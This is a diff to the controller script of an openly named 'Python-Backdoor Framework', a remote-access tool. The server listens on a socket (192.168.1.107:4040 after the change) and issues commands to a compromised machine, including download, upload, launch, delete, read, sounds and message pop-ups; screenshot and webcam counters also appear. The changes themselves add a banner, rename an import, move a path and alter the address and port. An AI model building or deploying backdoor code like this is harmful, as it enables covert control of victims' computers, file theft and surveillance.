@@ -2,21 +2,24 @@ import os
 import json
 import socket
 import base64
-import work_manager as wm
+import task_manager as tm
+from colorama import init, Fore
 
 class server_backdoor:
-    work_manager = wm.manager()
+    work_manager = tm.manager()
     required_arguments = ["download", "troll", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
 
-    TROLL_PATH = os.getcwd() +  "\SFX\\"
+    TROLL_PATH = os.getcwd() +  "\Backdoor\SFX\\"
     HACKED_SFX = TROLL_PATH + "CrazyLaugh.wav"
     TROLL_SFX = TROLL_PATH + "RunningAway.wav"
-
+    
     screenshot_counter = 1
     webcam_counter = 1
 
     def __init__(self, ip, port):
         try:
+            self.show_painting()
+
             listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             listener.bind((ip, port))
@@ -25,8 +28,26 @@ class server_backdoor:
             print("[+] Waiting for connections.")
             self.connection, address = listener.accept()
             print("[+] Got a connection from {}".format(address))
-        except socket.error() as e:
+        except Exception as e:
             print("Error connecting: {}".format(e))
+
+    def show_painting(self):
+        try:
+            init()      #Initializing colorama            
+            print("""\t{}______            _       _                  
+        | ___ \          | |     | |
+        | |_/ / __ _  ___| | ____| | ___   ___  _ __ 
+        | ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__|
+        | |_/ / (_| | (__|   < (_| | (_) | (_) | |   
+        \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
+                                (Python-Backdoor Framework)
+
+                                Vesion 1.1
+                                Author: Noam
+                                                        {}\n\n""".format(Fore.BLUE, Fore.WHITE))
+                
+        except Exception as e:
+            return "[-] Couldn't show the starting painting: {}".format(e)
 
     def reliable_send(self, data):
         try:
@@ -170,7 +191,7 @@ class server_backdoor:
                         file_content = self.read_file(file_path)
                         command.append(file_content)
                     elif command_0 == "troll":
-                        if rest_of_command != "2" and rest_of_command != "1":
+                        if rest_of_command != "1" and rest_of_command != "2":
                             print("[-] (Server) no such parameters for troll.")
                             continue
                         else:
@@ -209,5 +230,5 @@ class server_backdoor:
  
             print(result)
 
-server = server_backdoor("192.168.1.112", 4444)
+server = server_backdoor("192.168.1.107", 4040)
 server.run()
